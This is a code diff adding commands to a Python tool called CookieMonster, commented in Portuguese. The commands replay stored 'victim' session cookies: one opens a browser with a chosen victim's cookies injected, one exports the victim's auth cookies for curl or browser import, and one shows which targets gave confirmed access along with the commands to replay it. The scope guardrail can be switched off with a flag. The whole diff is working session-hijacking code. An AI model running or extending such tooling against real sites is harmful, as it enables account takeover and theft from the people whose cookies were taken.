@@ -320,6 +320,300 @@ def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
     console.print(f"\n[dim]run_id={run_id} salvo em runs[/dim]")
 
 
+# ---- Fase B: access -- abrir navegador e deixar o usuario interagir ----
+
+@cli.command()
+@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
+              show_default=True)
+@click.option("--domain", required=True, help="Dominio alvo (ex.: amazon.com)")
+@click.option("--victim", type=int, default=None,
+              help="ID da vitima (padrao: melhor para o dominio)")
+@click.option("--url", default=None,
+              help="URL alvo (padrao: https://<host>/)")
+@click.option("--scheme", type=click.Choice(["https", "http"]), default="https",
+              show_default=True)
+@click.option("--path", "req_path", default="/", show_default=True)
+@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
+              default="strict", show_default=True)
+@click.option("--allow-unsafe-scope", is_flag=True,
+              help="Desativa o guardrail de escopo.")
+@click.option("--max-wait-ms", type=int, default=10000, show_default=True,
+              help="Readiness maximo antes do navegador ser aberto.")
+@click.option("--wait-enter/--no-wait-enter", default=True,
+              help="Aguardar ENTER no terminal antes de fechar o navegador.")
+def access(db_path: Path, domain: str, victim: int, url: str,
+          scheme: str, req_path: str, replay_mode: str,
+          allow_unsafe_scope: bool, max_wait_ms: int, wait_enter: bool):
+    """Abre o navegador (headed) com os cookies da vitima ja injetados.
+
+    Voce pode interagir visualmente. O navegador fica aberto ate voce
+    pressionar ENTER no terminal (ou --no-wait-enter para abrir e fechar).
+    """
+    from playwright.sync_api import sync_playwright
+    from .domain.matcher import applicable_cookies
+    from .util import scope as scope_util
+    from .util.stealth import context_options
+
+    store = _load_store(str(db_path))
+    host = domain.split("://")[-1].strip("/")
+    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
+        console.print("[red]Recusado: alvo fora da allowlist (scope.txt). Use "
+                      "--allow-unsafe-scope para desabilitar (NAO recomendado).[/]")
+        return
+
+    # Seleciona vitima
+    if victim is None:
+        best = store.best_victims_for_domain(domain, limit=1)
+        if not best:
+            console.print(f"[red]Nenhuma vitima com cookies para {domain}[/]")
+            return
+        victim = best[0]["victim_id"]
+        console.print(f"[dim]Vitima selecionada automaticamente: vid={victim}[/dim]")
+
+    target_url = url or f"{scheme}://{host}{req_path}"
+    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
+    cookies = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)
+
+    if not cookies:
+        console.print(f"[yellow]Nenhum cookie aplicavel para {scheme}://{host}{req_path}[/]")
+        return
+
+    console.print(f"[bold bright_white]=== CookieMonster: ACCESS {domain} ===[/]")
+    console.print(f"  vitima: vid={victim}")
+    console.print(f"  cookies aplicaveis: {len(cookies)}")
+    console.print(f"  URL alvo: {target_url}")
+    console.print(f"\n[cyan]Abrindo navegador (headed)...[/cyan]")
+
+    # Reuso do client existente para montar cookies
+    from .inject import playwright_client
+    pw_cookies = playwright_client._to_playwright_cookies(cookies)
+
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=False, args=["--no-sandbox"])
+        ctx_opts = context_options(mode=replay_mode)
+        context = browser.new_context(**ctx_opts)
+        try:
+            for c in pw_cookies:
+                try:
+                    context.add_cookies([c])
+                except Exception:
+                    pass
+
+            page = context.new_page()
+            try:
+                page.goto(target_url, wait_until="domcontentloaded", timeout=30000)
+            except Exception as exc:
+                console.print(f"[yellow]aviso: goto falhou: {exc}[/yellow]")
+
+            page.wait_for_timeout(max_wait_ms // 4)
+
+            jar = context.cookies(target_url)
+            console.print(f"\n[cyan]NAVEGADOR ABERTO[/cyan]")
+            console.print(f"  URL atual: [yellow]{page.url}[/yellow]")
+            console.print(f"  Titulo: {page.title()}")
+            console.print(f"  Cookies no browser: {len(jar)}")
+
+            if wait_enter:
+                console.print(f"\n[bold cyan]>>> Pressione ENTER no terminal para fechar o navegador <<<[/bold cyan]")
+                try:
+                    input()
+                except EOFError:
+                    pass
+            else:
+                console.print(f"  (fechando automaticamente apos {max_wait_ms // 4}ms)...")
+                page.wait_for_timeout(max_wait_ms // 4)
+        finally:
+            try:
+                context.close()
+            except Exception:
+                pass
+            try:
+                browser.close()
+            except Exception:
+                pass
+    console.print(f"[dim]Navegador fechado.[/dim]")
+
+
+# ---- Fase C: export -- gera cookie jar pronto para uso ----
+
+@cli.command()
+@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
+              show_default=True)
+@click.option("--domain", required=True, help="Dominio alvo (ex.: amazon.com)")
+@click.option("--victim", type=int, default=None,
+              help="ID da vitima (padrao: melhor para o dominio)")
+@click.option("--scheme", type=click.Choice(["https", "http"]), default="https",
+              show_default=True)
+@click.option("--path", "req_path", default="/", show_default=True)
+@click.option("--output", "-o", type=click.Path(path_type=Path), default=None,
+              help="Arquivo de saida (padrao: stdout)")
+@click.option("--format", "fmt", type=click.Choice(["netscape", "json"]),
+              default="netscape", show_default=True,
+              help="Formato: netscape (curl -b) ou json (extensao de navegador)")
+@click.option("--include-anon", is_flag=True,
+              help="Incluir cookies anonimos tambem (default: so auth)")
+def export_cookies(db_path: Path, domain: str, victim: int,
+                   req_path: str, scheme: str, output: Path, fmt: str,
+                   include_anon: bool):
+    """Exporta os cookies aplicaveis ao alvo em formato pronto para uso.
+
+    Apenas cookies que passam o matcher RFC 6265 sao incluidos.
+
+    Formatos:
+      - netscape: tab-separado (curl -b, wget --load-cookies)
+      - json: lista de objetos (cookie import/export)
+
+    Exemplo de uso:
+      curl -b exported_cookies.txt https://example.com/api/me
+    """
+    from .domain.matcher import applicable_cookies
+
+    store = _load_store(str(db_path))
+    host = domain.split("://")[-1].strip("/")
+
+    if victim is None:
+        best = store.best_victims_for_domain(domain, limit=1)
+        if not best:
+            console.print(f"[red]Nenhuma vitima com cookies para {domain}[/]")
+            return
+        victim = best[0]["victim_id"]
+        console.print(f"[dim]Vitima selecionada: vid={victim}[/dim]")
+
+    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
+    cookies = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)
+
+    if not cookies:
+        console.print(f"[yellow]Nenhum cookie aplicavel para {scheme}://{host}{req_path}[/]")
+        return
+
+    if not include_anon:
+        from .domain.selection import is_auth_candidate
+        cookies = [c for c in cookies if is_auth_candidate(c["name"])]
+
+    if fmt == "netscape":
+        # Tab-separated: domain  includeSubdomains  path  secure  expiry  name  value
+        lines = ["# CookieMonster export (Netscape/curl format)"]
+        for c in cookies:
+            include_sub = "FALSE" if c.get("host_only") else "TRUE"
+            secure = "TRUE" if c.get("secure") else "FALSE"
+            expiry = c.get("expires_epoch") or 0
+            value = c.get("value", "").replace("\t", " ").replace("\n", " ")
+            lines.append(f"{c['domain']}\t{include_sub}\t{c['path']}\t{secure}\t{expiry}\t{c['name']}\t{value}")
+        out_text = "\n".join(lines) + "\n"
+    else:  # json
+        import json
+        out_text = json.dumps([
+            {
+                "domain": c["domain"],
+                "path": c["path"],
+                "secure": bool(c.get("secure")),
+                "http_only": bool(c.get("http_only")) if c.get("http_only") in (0, 1) else None,
+                "expires": c.get("expires_epoch") or 0,
+                "name": c["name"],
+                "value": c.get("value", ""),
+                "host_only": bool(c.get("host_only")),
+                "same_site": c.get("same_site") or "unknown",
+            }
+            for c in cookies
+        ], indent=2, ensure_ascii=False)
+
+    if output:
+        Path(output).write_text(out_text, encoding="utf-8")
+        console.print(f"[green]Exportados {len(cookies)} cookies para {output}[/green]")
+    else:
+        click.echo(out_text)
+
+
+# ---- Fase D: dashboard -- resumo amigavel dos ultimos runs ----
+
+@cli.command()
+@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
+              show_default=True)
+@click.option("--limit", type=int, default=10, show_default=True,
+              help="Numero de runs recentes a mostrar")
+def dashboard(db_path: Path, limit: int):
+    """Mostra os ultimos N runs com classificacao amigavel.
+
+    Destaque para:
+      - ACESSO CONFIRMADO (estado CONFIRMED)
+      - ACESSO PROVAVEL (estado LIKELY)
+      - ACESSO REJEITADO (estado ANONYMOUS)
+      - INDETERMINADO (estado UNKNOWN)
+    """
+    from collections import Counter
+
+    store = _load_store(str(db_path))
+
+    console.print(f"[bold bright_white]=== CookieMonster: Dashboard ===[/]\n")
+
+    # Sumario por estado (todos os runs)
+    all_runs = store.list_runs()
+    if not all_runs:
+        console.print("[yellow]Nenhum run registrado ainda. Rode 'probe' ou 'check'.[/]")
+        return
+
+    state_counter = Counter((r["state"] or "?") for r in all_runs)
+    total = len(all_runs)
+    confirmed = state_counter.get("CONFIRMED", 0)
+    likely = state_counter.get("LIKELY", 0)
+    anonymous = state_counter.get("ANONYMOUS", 0)
+    unknown = state_counter.get("?", 0) + state_counter.get("UNKNOWN", 0)
+
+    console.print(f"[bold]TOTAL: {total} runs[/bold]")
+    console.print(f"  [green]CONFIRMED (acesso confirmado): {confirmed}[/green]")
+    console.print(f"  [cyan]LIKELY (acesso provavel):     {likely}[/cyan]")
+    console.print(f"  [red]ANONYMOUS (acesso rejeitado):   {anonymous}[/red]")
+    console.print(f"  [yellow]UNKNOWN (indeterminado):       {unknown}[/yellow]")
+    console.print()
+
+    # Ultimos N runs com classificacao amigavel
+    console.print(f"[bold]ULTIMOS {limit} RUNS:[/bold]\n")
+    recent = all_runs[:limit]
+
+    table_data = []
+    for r in recent:
+        state = r["state"] or "?"
+        state_pt = {
+            "CONFIRMED": "[green]CONFIRMED[/]",
+            "LIKELY": "[cyan]LIKELY[/]",
+            "ANONYMOUS": "[red]ANONYMOUS[/]",
+            "UNKNOWN": "[yellow]UNKNOWN[/]",
+            "?": "[dim]?[/]",
+        }
+        state_disp = state_pt.get(state, state)
+        channel = r["channel"] or "?"
+        channel_disp = "PW" if channel == "playwright" else "HTTP" if channel == "httpx" else channel
+        run_id = r["id"]
+        domain = r["target_domain"]
+        victim_id = r["victim_id"]
+        findings = r["finding_count"] or 0
+        table_data.append((run_id, domain, victim_id, state_disp, channel_disp, findings))
+
+    # Renderiza tabela manual
+    console.print(f"  {'ID':>4}  {'DOMINIO':28}  {'VID':>5}  {'ESTADO':30}  {'CH':4}  {'ARTEFATOS':>9}")
+    console.print("  " + "-" * 90)
+    for run_id, domain, victim_id, state_disp, channel_disp, findings in table_data:
+        console.print(f"  {run_id:>4}  {domain[:28]:28}  {victim_id:>5}  {state_disp:30}  {channel_disp:4}  {findings:>9}")
+    console.print()
+
+    # Destaque: alvos com acesso confirmado
+    confirmed_runs = [r for r in all_runs if r["state"] == "CONFIRMED"]
+    if confirmed_runs:
+        console.print(f"[bold green]>>> {len(confirmed_runs)} ALVO(S) COM ACESSO CONFIRMADO:[/]")
+        seen = set()
+        for r in confirmed_runs[:5]:
+            key = (r["target_domain"], r["victim_id"])
+            if key in seen:
+                continue
+            seen.add(key)
+            console.print(f"  - [cyan]{r['target_domain']}[/] vitima={r['victim_id']} (run_id={r['id']})")
+        console.print(f"\n  [dim]Replicar acesso: python -m cookiemonster access --domain {confirmed_runs[0]['target_domain']}[/dim]")
+        console.print(f"  [dim]Exportar cookies: python -m cookiemonster export-cookies --domain {confirmed_runs[0]['target_domain']}[/dim]")
+    else:
+        console.print(f"[bold yellow]>>> NENHUM ACESSO CONFIRMADO nos runs existentes.[/]")
+        console.print(f"  [dim]Dica: rode probe/playwright em mais alvos para confirmar.[/dim]")
+
+
 def classify(name: str) -> str:
     """Classifica nome de cookie em 'auth'/'anon'/'other' (heuristica)."""
     from .domain.selection import classify_name
